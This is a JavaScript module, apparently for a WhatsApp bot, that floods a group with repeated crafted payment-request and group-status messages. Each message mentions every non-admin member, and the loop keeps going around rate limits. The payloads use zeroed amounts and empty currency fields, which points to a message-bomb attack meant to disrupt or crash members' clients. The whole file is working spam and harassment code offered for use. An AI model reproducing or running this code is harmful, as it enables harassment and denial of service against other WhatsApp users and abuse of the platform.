const fs = require('fs');

async function executarFlood(sock, groupId) {
    try {
        const gMeta = await sock.groupMetadata(groupId);
        const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        const admins = gMeta.participants.filter(v => v.admin !== null).map(v => v.id);
        const participantes = gMeta.participants
            .map(u => u.id)
            .filter(id => id !== botId && !admins.includes(id));

        const fullText = global.mensagemDiv || "MARCOS PASSOU O RATO 🤪";
        let statusText = fullText;
        if (fullText.includes("【↯💣")) {
            const parts = fullText.split(/【↯💣─────•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ👻❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•─────💣↯】/);
            if (parts.length >= 3) {
                statusText = (parts[0] + parts[2]).replace(/```/g, "").replace(/\n{3,}/g, "\n\n").trim();
            }
        }

        const count = global.quantidadeDiv || 1;
        for (let i = 0; i < count; i++) {
            try {
                // Envia Payment (DIV)
                await sock.relayMessage(groupId, {
                    requestPaymentMessage: {
                        currencyCodeIso4217: "BRL",
                        amount1000: "10000",
                        noteMessage: {
                            extendedTextMessage: {
                                text: fullText,
                                contextInfo: { mentionedJid: participantes }
                            }
                        }
                    }
                }, {});

                // Envia Status
                await sock.relayMessage(groupId, {
                    groupStatusMessageV2: {
                        message: {
                            requestPaymentMessage: {
                                currencyCodeIso4217: "",
                                amount1000: "0",
                                noteMessage: {
                                    extendedTextMessage: {
                                        text: statusText,
                                        contextInfo: { isGroupStatus: true, mentionedJid: participantes }
                                    }
                                },
                                expiryTimestamp: "0",
                                amount: { value: "0", offset: 1000, currencyCode: "" }
                            }
                        }
                    }
                }, {});

                await new Promise(r => setTimeout(r, 1700));
            } catch (err) {
                if (err.message.includes('rate-overlimit')) {
                    await new Promise(r => setTimeout(r, 2000));
                } else {
                    console.error("Erro ao enviar mensagens de flood:", err.message);
                }
            }
        }
    } catch (err) {
        console.error("Erro ao executar flood automático:", err.message);
    }
}

module.exports = { executarFlood };
